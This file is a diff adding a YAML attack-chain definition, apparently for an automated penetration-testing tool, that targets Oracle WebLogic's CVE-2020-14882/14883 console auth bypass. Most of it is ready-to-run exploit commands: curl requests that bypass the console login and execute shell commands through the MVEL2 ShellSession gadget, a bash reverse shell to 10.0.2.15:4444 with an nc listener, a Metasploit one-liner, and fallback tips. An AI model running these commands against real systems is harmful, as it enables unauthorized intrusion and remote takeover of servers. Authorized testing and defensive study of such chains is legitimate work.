@@ -1,0 +1,66 @@
+chain_id: weblogic_console_cve_2020_14882
+title: "Oracle WebLogic — CVE-2020-14882/14883 console auth bypass + RCE"
+severity: CRITICAL
+tags: [web, weblogic, oracle, cve-2020-14882, cve-2020-14883, auth-bypass, rce]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2020-14882" }
+    - { kind: "CVE-2020-14883" }
+    - { banner_pattern: "(?i)weblogic|oracle\\s*weblogic" }
+    - { product_pattern: "(?i)weblogic" }
+    - { path_pattern: "(?i)/console/(login/LoginForm\\.jsp|images)" }
+    - { port_in: [7001, 7002] }
+
+description: |
+  WebLogic 10.3.6, 12.1.3, 12.2.1.3/4, 14.1.1: the admin console's
+  path filter strips `..;` segments, letting an unauth request reach
+  `/console/images/%252E%252E%252Fconsole.portal`. CVE-2020-14882
+  is the bypass; CVE-2020-14883 is the
+  `com.tangosol.coherence.mvel2.sh.ShellSession` gadget that turns
+  console access into RCE. One curl chain.
+
+steps:
+  - id: 1
+    title: "Probe the bypass — should land on console.portal"
+    command: |
+      curl -sk -i "http://$VICTIMA:7001/console/css/%252E%252E%252Fconsole.portal"
+
+  - id: 2
+    title: "RCE via MVEL2 ShellSession (one-shot id)"
+    command: |
+      curl -sk "http://$VICTIMA:7001/console/css/%252E%252E%252Fconsole.portal" \
+        --data-urlencode "_nfpb=true" \
+        --data-urlencode "_pageLabel=" \
+        --data-urlencode "handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec(new String[]{'/bin/sh','-c','id > /tmp/r'});\")"
+      # Then read the result:
+      curl -sk "http://$VICTIMA:7001/console/css/%252E%252E%252Fconsole.portal?handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(new+String[]{'/bin/sh','-c','cat+/tmp/r'});%22)"
+
+  - id: 3
+    title: "Reverse shell"
+    command: |
+      nc -lvnp 4444
+      curl -skG "http://$VICTIMA:7001/console/css/%252E%252E%252Fconsole.portal" \
+        --data-urlencode "_nfpb=true" \
+        --data-urlencode "_pageLabel=" \
+        --data-urlencode "handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec(new String[]{'/bin/bash','-c','bash -i >& /dev/tcp/10.0.2.15/4444 0>&1'});\")"
+
+  - id: 4
+    title: "Or with Metasploit"
+    command: |
+      msfconsole -qx 'use exploit/multi/misc/weblogic_deserialize_unicastref; \
+        set RHOSTS $VICTIMA; set RPORT 7001; \
+        set LHOST 10.0.2.15; set LPORT 4444; run'
+
+common_errors:
+  - error: "302 to /console/login/LoginForm.jsp"
+    solution: |
+      Bypass blocked. Try the second variant
+      `/console/images/%252E%252E%252Fconsole.portal`, or attack the
+      T3/IIOP listener directly with `nuclei -t weblogic` or
+      `WebLogicScanner`.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2020-14882
+  - https://nvd.nist.gov/vuln/detail/CVE-2020-14883
+  - https://www.oracle.com/security-alerts/cpuoct2020.html
